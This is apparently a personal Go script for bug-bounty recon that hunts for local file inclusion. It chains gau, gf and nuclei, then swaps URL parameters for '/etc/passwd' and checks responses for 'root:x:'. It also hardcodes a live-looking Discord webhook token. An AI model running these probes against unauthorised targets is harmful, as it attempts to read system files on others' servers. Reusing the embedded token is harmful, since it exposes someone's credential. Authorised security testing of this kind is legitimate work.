package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "syscall"
    "time"
)

// remindToStartDocker checks if Docker is running and reminds the user to start it if not
func remindToStartDocker() {
    cmd := exec.Command("docker", "info")
    err := cmd.Run()
    if err != nil {
        fmt.Println("Have you remembered to start Docker? If not, cancel the script and run 'sudo dockerd' in another terminal.")
    }
}

// validateProgram checks if the provided program is valid
func validateProgram(program string) bool {
    validPrograms := []string{"Bugcrowd", "HackerOne", "Intigriti", "Synack", "YesWeHack"}
    for _, validProgram := range validPrograms {
        if program == validProgram {
            return true
        }
    }
    return false
}

// getUserAgent returns the user-agent based on the program
func getUserAgent(program string) string {
    switch program {
    case "Bugcrowd":
        return "User-Agent:Bugcrowd:brainspiller"
    case "HackerOne":
        return "User-Agent:HackerOne:brainspiller"
    case "Intigriti":
        return "User-Agent:Intigriti:brainspiller"
    case "Synack":
        return "User-Agent:Synack:brainspiller"
    case "YesWeHack":
        return "User-Agent:YesWeHack:brainspiller"
    default:
        return ""
    }
}

// executeCommand runs a command and handles errors, capturing its output
func executeCommand(cmd *exec.Cmd) {
    fmt.Printf("\033[33mExecuting command: %s\033[0m\n", strings.Join(cmd.Args, " ")) // Orange color for executing commands
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    if err := cmd.Run(); err != nil {
        log.Fatalf("Command failed: %v", err)
    }
}

// executeCommandWithOutput runs a command and captures its output and error messages
func executeCommandWithOutput(cmd *exec.Cmd) (string, string, error) {
    fmt.Printf("\033[33mExecuting command: %s\033[0m\n", strings.Join(cmd.Args, " ")) // Orange color for executing commands
    var stdout, stderr strings.Builder
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr
    err := cmd.Run()
    return stdout.String(), stderr.String(), err
}

// readAndCombineFiles reads and combines unique lines from multiple files
func readAndCombineFiles(files []string, outputFile string) {
    contentMap := make(map[string]struct{})
    for _, file := range files {
        data, err := ioutil.ReadFile(file)
        if err != nil {
            log.Fatalf("Failed to read file %s: %v", file, err)
        }
        lines := strings.Split(string(data), "\n")
        for _, line := range lines {
            if line != "" {
                contentMap[line] = struct{}{}
            }
        }
    }

    outputData := ""
    for line := range contentMap {
        outputData += line + "\n"
    }

    if err := ioutil.WriteFile(outputFile, []byte(outputData), 0644); err != nil {
        log.Fatalf("Failed to write to %s: %v", outputFile, err)
    }
}

// sendDiscordNotification sends a notification to a Discord webhook
func sendDiscordNotification(webhookURL, message string) error {
    payload := map[string]string{"content": message}
    jsonData, err := json.Marshal(payload)
    if err != nil {
        return fmt.Errorf("failed to marshal payload: %v", err)
    }

    resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return fmt.Errorf("failed to send POST request: %v", err)
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusNoContent {
        body, _ := ioutil.ReadAll(resp.Body)
        return fmt.Errorf("unexpected response from Discord: %s", body)
    }

    return nil
}

// showProgress shows progress while a long-running command is executed
func showProgress(pid int) {
    delay := 300 * time.Second
    for {
        fmt.Println("Nuclei scan in progress, please wait...")
        time.Sleep(delay)
        if err := syscall.Kill(pid, 0); err != nil {
            break
        }
    }
}

// runNucleiScan runs the nuclei scan with progress indicator
func runNucleiScan(description, outputFile, nucleiCmd string) {
    fmt.Printf("Running nuclei %s...\n", description)
    cmd := exec.Command("sh", "-c", nucleiCmd)

    if err := cmd.Start(); err != nil {
        log.Fatalf("Failed to start nuclei scan: %v", err)
    }

    go showProgress(cmd.Process.Pid)

    if err := cmd.Wait(); err != nil {
        log.Fatalf("Nuclei scan failed: %v", err)
    }

    fmt.Printf("Nuclei %s completed. Results saved to %s.\n", description, outputFile)
}

func main() {
    remindToStartDocker()

    if len(os.Args) != 3 {
        fmt.Println("Usage: go run lfi-detection.go <domain> <program>")
        fmt.Println("Programs: Bugcrowd, HackerOne, Intigriti, Synack, YesWeHack")
        os.Exit(1)
    }

    domain := os.Args[1]
    program := os.Args[2]
    outputBaseDir := "/home/brainspiller/Documents/hunt"
    toolDir := "/home/brainspiller/go/bin"
    nucleiCmd := filepath.Join(toolDir, "nuclei")
    discordWebhookURL := "https://discord.com/api/webhooks/1260622118387716187/TCK6V4u4biJ6BMHnmHuv5MMs8P0vOHa0X2HoNjIP6VBBysTFRYTLuVsnXBpVKxpSQRrr"

    if !validateProgram(program) {
        fmt.Println("Invalid program. Choose from: Bugcrowd, HackerOne, Intigriti, Synack, YesWeHack")
        os.Exit(1)
    }

    userAgent := getUserAgent(program)
    outputDir := filepath.Join(outputBaseDir, program, domain)

    fmt.Printf("Changing to output directory: %s\n", outputDir)
    if err := os.Chdir(outputDir); err != nil {
        log.Fatalf("Failed to change directory: %v", err)
    }

    lfiFile := filepath.Join(outputDir, "lfi.txt")

    fmt.Println("Processing URLs for potential LFI...")
    gauCmd := exec.Command("sh", "-c", fmt.Sprintf("cat %s | %s | /usr/local/bin/uro | %s lfi | tee %s", filepath.Join(outputDir, "AliveSubs.txt"), filepath.Join(toolDir, "gau"), filepath.Join(toolDir, "gf"), lfiFile))
    executeCommand(gauCmd)

    if stat, err := os.Stat(lfiFile); err == nil && stat.Size() > 0 {
        fmt.Println("\033[32mPotential LFI URLs have been saved to lfi.txt.\033[0m")
    } else {
        fmt.Println("\033[31mNothing found for LFI! Better luck next time.\033[0m")
        os.Exit(0)
    }

    fmt.Println("Running nuclei scan on lfi.txt...")
    runNucleiScan("LFI scan on lfi.txt", "lfiFindings.json", fmt.Sprintf("%s -list %s -tags lfi -H %q -o lfiFindings.json --rl 5", nucleiCmd, lfiFile, userAgent))

    fmt.Println("Checking potential LFI vulnerabilities manually...")
    qsreplaceCmd := exec.Command("sh", "-c", fmt.Sprintf("cat %s | qsreplace \"/etc/passwd\" | while read url; do curl -s \"$url\" | grep \"root:x:\" && echo \"$url is Vulnerable\"; done;", lfiFile))
    stdout, stderr, err := executeCommandWithOutput(qsreplaceCmd)
    if err != nil {
        fmt.Printf("Error during manual LFI check: %v\nStdout: %s\nStderr: %s\n", err, stdout, stderr)
    }

    fmt.Printf("User-Agent: %s\n", userAgent)
    fmt.Println("\033[31mLFI detection completed\033[0m")

    message := fmt.Sprintf("Bug bounty - **LFI-Detection** has completed for **%s** on **%s**. Check your **lfiFindings.json** to see potential LFI vulnerabilities.", domain, program)
    if err := sendDiscordNotification(discordWebhookURL, message); err != nil {
        log.Fatalf("Failed to send Discord notification: %v", err)
    }
}
